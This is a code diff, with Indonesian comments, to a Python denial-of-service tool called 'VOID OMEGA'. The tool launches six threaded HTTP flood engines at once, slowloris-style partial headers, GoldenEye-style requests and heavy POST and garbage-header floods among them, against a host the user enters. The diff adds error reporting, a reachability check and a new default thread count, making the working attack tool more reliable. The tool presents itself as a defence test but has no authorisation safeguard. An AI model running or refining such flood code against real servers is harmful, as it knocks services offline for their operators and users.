@@ -14,6 +14,7 @@ import ssl
 total_hits = 0
 hit_lock = threading.Lock()
 stop_event = threading.Event()
+DEBUG_MODE = False  # Akan di-set dari input user
 
 # ==================================================
 # FUNGSI PENDUKUNG (Logo & Warna)
@@ -45,14 +46,14 @@ logo_omega = r"""
  ▄████████▀  █▀   █████▄▄██   ██████████ ████████▀    ██████████ 
                 ▀                                                
         ╔═══════════════════════════════════════════╗
-        ║     V O I D   O M E G A   (ULTIMATE)     ║
-        ║  6 TEKNIK SERANGAN DALAM 1 EKSEKUSI      ║
+        ║     V O I D   O M E G A   (DEBUG)        ║
+        ║  6 TEKNIK SERANGAN + ERROR REPORTING     ║
         ╚═══════════════════════════════════════════╝
                [ MODE: TOTAL OBLITERATION ]
 """
 
 # ==================================================
-# 6 ENGINE SERANGAN (Dioptimalkan untuk Paralel)
+# 6 ENGINE SERANGAN (DENGAN PRINT ERROR)
 # ==================================================
 
 def vulcan_engine(target, port, ssl_on, ip):
@@ -83,7 +84,10 @@ def vulcan_engine(target, port, ssl_on, ip):
                 s.send(header.encode())
                 with hit_lock: total_hits += 1
             s.close()
-        except: pass
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"\033[1;31m[ERROR VULCAN]\033[0m {e}")
+            time.sleep(0.5)
 
 def phantom_engine(target, port, ssl_on, ip):
     while not stop_event.is_set():
@@ -113,9 +117,12 @@ def phantom_engine(target, port, ssl_on, ip):
                 if stop_event.is_set(): break
                 s.send(payload.encode())
                 with hit_lock: total_hits += 1
-                time.sleep(random.uniform(0.5, 1.5))  # Lebih cepat dari aslinya
+                time.sleep(random.uniform(0.5, 1.5))
             s.close()
-        except: pass
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"\033[1;31m[ERROR PHANTOM]\033[0m {e}")
+            time.sleep(0.5)
 
 def oblivion_engine(target, port, ssl_on, ip):
     ua_list = [
@@ -148,7 +155,10 @@ def oblivion_engine(target, port, ssl_on, ip):
                 with hit_lock: total_hits += 1
                 time.sleep(random.randint(5, 10))
             s.close()
-        except: pass
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"\033[1;31m[ERROR OBLIVION]\033[0m {e}")
+            time.sleep(0.5)
 
 def heavypost_engine(target, port, ssl_on, ip):
     payload_body = ''.join(random.choices(string.ascii_letters + string.digits, k=2048))
@@ -184,7 +194,10 @@ def heavypost_engine(target, port, ssl_on, ip):
                 s.send(request.encode())
                 with hit_lock: total_hits += 1
             s.close()
-        except: pass
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"\033[1;31m[ERROR HEAVYPOST]\033[0m {e}")
+            time.sleep(0.5)
 
 def goldeneye_engine(target, port, ssl_on, ip):
     ua_list = [
@@ -226,7 +239,10 @@ def goldeneye_engine(target, port, ssl_on, ip):
                 s.send(request.encode())
                 with hit_lock: total_hits += 1
             s.close()
-        except: pass
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"\033[1;31m[ERROR GOLDENEYE]\033[0m {e}")
+            time.sleep(0.5)
 
 def doomsday_engine(target, port, ssl_on, ip):
     garbage = ''.join(random.choices(string.ascii_letters + string.digits, k=4096))
@@ -258,33 +274,76 @@ def doomsday_engine(target, port, ssl_on, ip):
                 s.send(header.encode())
                 with hit_lock: total_hits += 1
             s.close()
-        except: pass
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"\033[1;31m[ERROR DOOMSDAY]\033[0m {e}")
+            time.sleep(0.5)
+
+# ==================================================
+# FUNGSI PENGECEKAN KONEKSI AWAL
+# ==================================================
+def test_connection(target, port, ssl_on):
+    """Mencoba koneksi sekali ke target untuk memastikan bisa dijangkau"""
+    print(f"\n\033[1;33m[!] Melakukan uji koneksi ke {target}:{port}...\033[0m")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        if ssl_on:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = ctx.wrap_socket(s, server_hostname=target)
+        s.connect((target, port))
+        s.close()
+        print("\033[1;32m[✓] Koneksi BERHASIL! Target dapat dijangkau.\033[0m")
+        return True
+    except Exception as e:
+        print(f"\033[1;31m[✗] Koneksi GAGAL! Error: {e}\033[0m")
+        return False
 
 # ==================================================
 # MAIN EXECUTION
 # ==================================================
 def main():
+    global DEBUG_MODE
     clear_screen()
     print(rgb_text(logo_omega, 5))
     print("\033[1;33m[!] SISTEM PERTAHANAN ANDA AKAN DIUJI DENGAN 6 VEKTOR SEKALIGUS\033[0m")
     
+    # Input target
     target = input("\n\033[1;36m[?] Target Host/IP (tanpa http://): \033[0m").strip()
-    if not target: return
+    if not target:
+        print("\033[1;31m[!] Target tidak boleh kosong.\033[0m")
+        return
+    
     port = int(input("\033[1;36m[?] Port (80/443): \033[0m") or 80)
     ssl_on = (port == 443)
     
-    # Total thread dibagi rata ke 6 engine
-    total_threads = int(input("\033[1;36m[?] Total Threads (Rekomendasi 300-600): \033[0m") or 300)
+    # Mode Debug
+    debug_input = input("\033[1;36m[?] Tampilkan error debugging? (y/n): \033[0m").strip().lower()
+    DEBUG_MODE = (debug_input == 'y')
+    
+    # Total thread
+    total_threads = int(input("\033[1;36m[?] Total Threads (Rekomendasi 100-300): \033[0m") or 150)
     threads_per_engine = max(1, total_threads // 6)
     
+    # Resolve IP
     try:
         ip = socket.gethostbyname(target)
-    except:
-        print("\033[1;31m[!] Gagal resolve host.\033[0m")
+        print(f"\033[1;32m[✓] DNS Resolve: {target} -> {ip}\033[0m")
+    except Exception as e:
+        print(f"\033[1;31m[!] Gagal resolve host: {e}\033[0m")
         return
-
+    
+    # Uji koneksi dasar
+    if not test_connection(ip, port, ssl_on):
+        print("\033[1;31m[!] Target tidak bisa dijangkau. Periksa firewall, port, atau koneksi internet.\033[0m")
+        input("\nTekan Enter untuk keluar...")
+        return
+    
     print(f"\n\033[1;32m[✓] Target: {target} ({ip}) | Port: {port} | SSL: {'ON' if ssl_on else 'OFF'}\033[0m")
     print(f"\033[1;32m[✓] Threads per Engine: {threads_per_engine} (Total: {threads_per_engine * 6})\033[0m")
+    print(f"\033[1;32m[✓] Debug Mode: {'ON' if DEBUG_MODE else 'OFF'}\033[0m")
     print("\033[1;31m[!] MENEMBAKKAN 6 SENJATA SEKALIGUS... Tekan CTRL+C kapan saja untuk stop.\033[0m")
     input("Tekan Enter untuk memulai OMEGA...")
 
@@ -302,13 +361,14 @@ def main():
         (doomsday_engine, "Doomsday")
     ]
 
-    # Jalankan semua engine secara paralel
+    # Jalankan semua engine
     for engine_func, name in engines:
         for _ in range(threads_per_engine):
             t = threading.Thread(target=engine_func, args=(target, port, ssl_on, ip))
             t.daemon = True
             t.start()
         print(f"\033[1;30m[+] {name} engine deployed with {threads_per_engine} threads.\033[0m")
+        time.sleep(0.1)  # Supaya output rapi
 
     # Monitor
     try:
@@ -325,6 +385,8 @@ def main():
 
     print(f"\n\033[1;33m[!] Total Hits Akhir: {total_hits}\033[0m")
     print("\033[1;33m[!] Uji pertahanan selesai. Periksa log dan CPU server Anda.\033[0m")
+    if total_hits == 0 and DEBUG_MODE:
+        print("\033[1;31m[!] Tidak ada hit yang berhasil. Periksa error di atas.\033[0m")
     input("\nTekan Enter untuk keluar...")
 
 if __name__ == "__main__":
